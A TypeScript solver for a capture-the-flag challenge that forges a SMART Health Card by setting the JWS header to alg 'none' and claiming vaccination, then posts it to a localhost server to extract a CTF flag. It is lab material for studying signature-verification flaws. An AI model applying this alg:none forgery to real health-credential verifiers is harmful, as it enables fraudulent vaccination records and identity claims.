import axios from 'axios';
import qs from 'qs';
import { Solution } from "../utils";
import { SHC } from '../../src/shc';

const URL = "http://localhost:1337/samples/2";

export class Solve extends Solution {
    public async solve() {
        let shc = new SHC(
            {
                "alg": "none",
                "kid": "null",
                "zip": "DEF"
            }, 
            {
                "iss": URL,
                "name": {
                    "given": "John",
                    "family": "Doe"
                },
                "vaccinated": true
            }
        );

        let data = (await axios.post(URL, qs.stringify({
            shc: shc.toString()
        }))).data;

        let regex = /CTF{.*?}/.exec(data);

        if(regex) {
            console.log(regex[0]);
        } else {
            console.log("FAIL:", data);
        }
    }
}
